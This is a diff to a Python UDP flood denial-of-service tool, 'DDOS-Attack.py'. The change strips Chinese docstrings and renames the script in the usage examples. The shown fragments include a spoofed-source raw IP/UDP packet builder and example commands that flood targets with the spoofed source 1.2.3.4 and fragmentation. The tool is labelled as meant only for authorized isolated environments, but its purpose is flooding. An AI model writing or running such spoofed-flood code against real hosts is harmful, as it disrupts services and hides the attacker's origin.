@@ -10,7 +10,6 @@ import argparse
 
 # ==================== 跨平台清屏函数 ====================
 def clear_screen():
-    """清屏，兼容 Windows (cls) 和 Unix-like (clear)"""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
@@ -63,7 +62,6 @@ def show_banner():
 
 # ==================== 连通性检查 ====================
 def check_target(ip, port, timeout=3):
-    """TCP 连通性测试（注意：TCP 可达 ≠ UDP 可达，仅作参考）"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
@@ -76,7 +74,6 @@ def check_target(ip, port, timeout=3):
 
 # ==================== 伪造 IP 包构造 ====================
 def build_ip_udp_packet(spoof_ip, target_ip, src_port, dst_port, payload):
-    """构造带伪造源 IP 的原始 IP + UDP 数据包"""
     ip_header_len = 20
     udp_header_len = 8
     total_len = ip_header_len + udp_header_len + len(payload)
@@ -107,12 +104,12 @@ def build_ip_udp_packet(spoof_ip, target_ip, src_port, dst_port, payload):
 # ==================== 参数解析 ====================
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="UDP Flood Attack Tool (仅用于授权的隔离环境)",
+        description="[>]UDP Flood Attack Tool (仅用于授权的隔离环境)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""示例:
-  python DDOS-Attack.py -t 192.168.1.100 -p 53 -g 1
-  python DDOS-Attack.py -t 10.0.0.1 -p 80 -g 5 --random-port
-  sudo python DDOS-Attack.py -t 10.0.0.1 -p 53 -g 1 --spoof 1.2.3.4 --frag
+  python DDOS-Attack_03_c.py -t 192.168.1.100 -p 53 -g 1
+  python DDOS-Attack_03_c.py -t 10.0.0.1 -p 80 -g 5 --random-port
+  sudo python DDOS-Attack_03_c.py -t 10.0.0.1 -p 53 -g 1 --spoof 1.2.3.4 --frag
 """
     )
     parser.add_argument('-t', '--target', required=True,
